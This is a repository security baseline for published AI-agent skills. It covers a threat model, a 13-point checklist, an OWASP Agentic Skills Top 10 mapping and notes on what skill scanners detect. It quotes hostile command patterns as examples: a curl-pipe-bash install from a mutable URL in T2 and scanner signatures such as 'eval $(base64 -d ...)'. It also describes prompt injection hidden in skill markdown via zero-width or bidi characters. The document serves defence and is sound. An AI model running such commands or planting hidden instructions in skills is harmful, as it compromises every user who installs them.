# Skills Security Baseline

Threat model, mandatory controls, and the OWASP Agentic Skills Top 10 mapping for every skill published from this repo. This is the **what** and **why**; for the **how** (CI pipeline, registry submission), see [publishing-guide.md](publishing-guide.md). For the disclosure process and PR-gating checklist, see [skills/SECURITY.md](../../skills/SECURITY.md).

## Why this baseline exists

Snyk's February 2026 ToxicSkills audit scanned 3,984 skills across ClawHub and skills.sh and found:

- **534 (13.4%) had critical-level security issues** — credential theft, backdoor installation, data exfiltration.
- **76 carried confirmed malicious payloads.**
- **91% of malicious skills combined prompt injection with traditional malware** — a hybrid attack approach that bypasses both AI safety mechanisms and traditional security tools.

The base rate of "a published skill is critically vulnerable" is therefore around 1 in 7. Skills run with the **full permissions of the host agent**. A compromised Vrooli skill compromises every user who installs it, plus everything that user's agent has access to. The supply-chain blast radius makes this a higher-stakes category than most application security categories.

The Vrooli baseline is designed to land us at "demonstrably better than 99% of published skills." This is achievable because the bar is low; almost no publishers do supply-chain hygiene at all.

## Threat model

The threats specifically relevant to skills published by Vrooli:

### T1 — Compromised release pipeline produces a malicious skill

A maintainer's GitHub credentials are compromised, or a malicious PR slips into a skill folder. Without signing/provenance, downstream consumers cannot tell that a tampered version was published.

**Mitigation:** Cosign keyless signing via Fulcio, SLSA L3 provenance attached as OCI referrer. Verifies *which* GitHub Action run on *which* commit produced the artifact. Tampering is detectable.

### T2 — Install script downloads malicious content from a now-compromised URL

`scripts/install.sh` does `curl https://example.com/install.sh | bash`. The example.com domain is later compromised (or DNS is hijacked). Every installer of the skill, going forward, runs malicious code.

**Mitigation:** Pinned commit SHAs / release tags only, plus SHA-256 checksum verification on every download. Mutable URLs are rejected at scan time.

### T3 — Prompt injection in SKILL.md or references manipulates agent reasoning

Hidden instructions in the markdown body (especially via zero-width unicode or bidi marks) cause the agent to execute commands the user didn't intend. The Snyk audit found 91% of malicious skills combine this with traditional malware to bypass both AI and conventional defenses.

**Mitigation:** Hidden-unicode sanitization at CI time. LLM-as-judge scan for prompt-injection patterns. Two-reviewer requirement on PRs that touch SKILL.md or references.

### T4 — Excessive permissions in `allowed-tools` enable privilege escalation

A skill declares `Bash(*)` or `WebFetch(*)`. Even if the skill itself is benign, a downstream prompt injection in the agent's *task* can leverage the skill's broad permissions.

**Mitigation:** Minimal `allowed-tools` enforced at CI time. `Bash(*)` is rejected. Only specific tool patterns matching the wrapped CLI are allowed.

### T5 — Skill ↔ scenario CLI drift creates undefined behavior

The wrapped scenario's CLI changes; the skill's documented commands no longer match reality. The agent runs commands that don't exist or have changed semantics, potentially with destructive side effects.

**Mitigation:** Skill versions are pinned to specific scenario release tags. CI runs an integration check that every command shown in SKILL.md exists in the wrapped CLI at the pinned scenario version. Drift fails the build.

### T6 — Supply-chain compromise of a transitive dependency

A package the install script pulls in has its registry account hijacked, and a malicious version is published.

**Mitigation:** SBOM attached as OCI referrer; consumer-side scanners can compare against known-vulnerable package lists. All install-script downloads are checksummed against known-good values.

### T7 — Telemetry leak through install pings or scenario CLI

The install ping or the wrapped scenario emits PII or sensitive data to a Vrooli-controlled endpoint without the user's informed consent.

**Mitigation:** Install pings carry only version + registry + host runtime, no PII. Documented transparently in SKILL.md. Scenario CLI behavior is the responsibility of the scenario, not the skill, but skills that wrap scenarios with telemetry must surface that disclosure.

## The 13-point baseline checklist

Every published skill, every release, every time. CI enforces what it can; reviewers and the PR template enforce the rest.

### Build-time

1. **Cosign signature** attached to the OCI artifact via Sigstore keyless flow.
2. **SLSA Level 3 provenance attestation** generated by `slsa-github-generator`, attached as OCI referrer.
3. **SBOM (CycloneDX)** generated by Syft, attached as OCI referrer.
4. **Pinned install targets** — every download has a specific tag/SHA + SHA-256 checksum.
5. **Minimal `allowed-tools`** in YAML frontmatter — only the specific tool patterns the skill needs.
6. **No remote URLs in SKILL.md body** — network calls live only in install scripts (which the user reads) or the wrapped CLI (signed separately).
7. **Hidden-unicode sanitization** — zero-width chars, bidi marks, non-NFC normalization rejected by CI.

### Scan-time

8. **Snyk Agent Scan** clean of critical and high findings.
9. **Cisco Skill Scanner** clean of critical findings.
10. **Third scanner of choice** (SkillShield / ESET / equivalent) clean.

### Review-time

11. **Two-reviewer requirement** — at least one reviewer is on the security-aware reviewers list.
12. **OWASP Agentic Skills Top 10 mapping** — for each item, the PR description states why this skill is not vulnerable to it, or what mitigation is in place.

### Post-publish

13. **Kill-switch documented and exercised** — Cosign revocation, registry takedown, public advisory all known and runnable in <1 hour. Practice annually.

## OWASP Agentic Skills Top 10 mapping

The OWASP Agentic Skills Top 10 is the de-facto external standard skill scanners and security reviewers grade against. Each published Vrooli skill must explicitly map against it in the PR description.

| OWASP item | What it is | How Vrooli's baseline addresses it |
|---|---|---|
| **A01 — Prompt Injection in Skill Content** | Hidden or overt instructions in SKILL.md or references that hijack agent reasoning | Hidden-unicode CI sanitization + LLM-as-judge scan + two-reviewer PR rule |
| **A02 — Excessive Permissions** | `allowed-tools` granting more than the skill needs | Minimal `allowed-tools` enforced at scan time; `Bash(*)` rejected |
| **A03 — Insecure Install Scripts** | `curl \| bash` to mutable URLs, no checksum verification | Pinned tags + SHA-256 checksums required; CI rejects bare curl-pipe-bash |
| **A04 — Supply Chain Tampering** | Compromised maintainer credentials or PR-injected malicious code | Cosign keyless signing + SLSA L3 provenance; tampering detectable post-publish |
| **A05 — Vulnerable Dependencies** | Transitive deps with known CVEs or compromised registry accounts | SBOM attached as OCI referrer; consumer scanners can correlate |
| **A06 — Telemetry / PII Exfiltration** | Skill emits user data to attacker-controlled endpoints | No remote URLs in SKILL.md body; install pings limited to version+registry+runtime; transparently disclosed |
| **A07 — Privilege Confusion via Wrapped Tool** | Skill grants narrow permissions but wrapped CLI has broader access | Wrap-not-use principle: CLI enforces auth/scope/audit at its layer; skill cannot bypass |
| **A08 — Drift Between Skill and Wrapped Tool** | Documented commands no longer match CLI reality | CI integration check: every command shown in SKILL.md exists in wrapped CLI at pinned scenario version |
| **A09 — Missing Provenance / Trust Signals** | No way for consumers to verify origin | Cosign + SLSA + SBOM all attached; verification one-liner published in every SKILL.md |
| **A10 — Inadequate Incident Response** | No kill-switch when a vulnerability is found | Documented revocation/takedown/advisory procedure; runnable in <1 hour |

## Vrooli's structural advantages

Two assets we already have map cleanly to a stronger trust posture than most publishers can claim:

### Workspace-sandbox

[Workspace-sandbox](../../scenarios/workspace-sandbox/) is Vrooli's per-action accountability substrate — every file change, every command, traceable to a specific run. When a published skill installs the wrapped scenario to run *under* workspace-sandbox by default, this gives consumers a verifiable audit trail at the wrapped-CLI layer. Most published skills go raw-shell; "runs under workspace-sandbox" is a real differentiator.

When a skill takes advantage of this, **mention it in the SKILL.md description**. It is a measurable trust signal in a market where the base rate of critical vulns is 1 in 7.

### Wrap-not-use principle

Skills wrap our CLI tools, which wrap the actual sensitive operations. This means auth, scope, and audit logging live at the **CLI layer**, not at the skill layer. A compromised or buggy skill cannot bypass auth that's enforced inside the CLI's process. This is the same architectural principle that protects Vrooli's internal scenarios from each other; published skills get the benefit transparently.

## What scanners actually check

For reference, when we say "Snyk Agent Scan clean" or "Cisco Skill Scanner clean," here's what they're doing under the hood:

- **Pattern-based static analysis (YAML + YARA rules)** — known-bad signatures: `curl ... | bash`, `eval $(base64 -d ...)`, hardcoded credential paths, suspicious shell constructs.
- **LLM-as-judge** — an LLM reads SKILL.md and scripts, rates "would executing this be harmful?" Catches prompt-injection language and intent.
- **Behavioral / dataflow analysis** — simulates the skill in a sandboxed agent runtime; watches what files it reads, what URLs it hits, what processes it spawns.
- **Supply-chain tracing** — follows every URL referenced (including transitive redirects from install-script downloads) and re-scans.
- **Hidden-unicode detection** — normalizes text and flags zero-width chars, bidi marks, non-printable sequences.

Our baseline is designed to pass all five layers cleanly. If a build fails any of them, the failure is real — fix the underlying issue, don't disable the check.

## Reference

- [Snyk ToxicSkills audit (Feb 2026)](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/) — the audit that motivates this baseline
- [OWASP Agentic Skills Top 10](https://owasp.org/www-project-agentic-skills-top-10/) — external standard
- [Snyk Agent Scan / Skill Inspector](https://labs.snyk.io/resources/agent-scan-skill-inspector/)
- [Cisco AI Defense Skill Scanner](https://github.com/cisco-ai-defense/skill-scanner)
- [Hidden Unicode Instructions in Skills (Embrace The Red)](https://embracethered.com/blog/posts/2026/scary-agent-skills/)
- [Sigstore / Cosign documentation](https://docs.sigstore.dev/)
- [SLSA framework](https://slsa.dev/)
- [skills/SECURITY.md](../../skills/SECURITY.md) — disclosure process and PR checklist
- [publishing-guide.md](publishing-guide.md) — the pipeline that enforces this baseline
